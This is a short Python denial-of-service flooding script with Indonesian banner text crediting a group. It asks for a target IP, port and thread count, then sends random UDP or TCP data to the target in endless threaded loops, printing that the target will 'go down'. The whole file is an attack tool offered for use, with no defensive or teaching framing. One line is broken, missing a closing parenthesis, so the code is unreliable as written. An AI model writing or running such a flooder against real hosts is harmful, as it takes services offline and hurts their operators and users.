#!/usr/bin/env python3
#Code by Dendi
import random
import socket
import threading

print("~~~ DDOS KHUSUS TIM BOD ~~~")
print("~~~ Code and script by Devilz samp ~~~")
print("~~~ TOLLS KHUSUS TIM BOD ~~~")
print("~~~ DUA MAUT RA4PI4 D3BoY ~~~")
ip = str(input(" target ip:")
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Memberi kopi ke target:"))
threads = int(input(" Roko yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NANTI DOWN!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NANTI DOWN!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()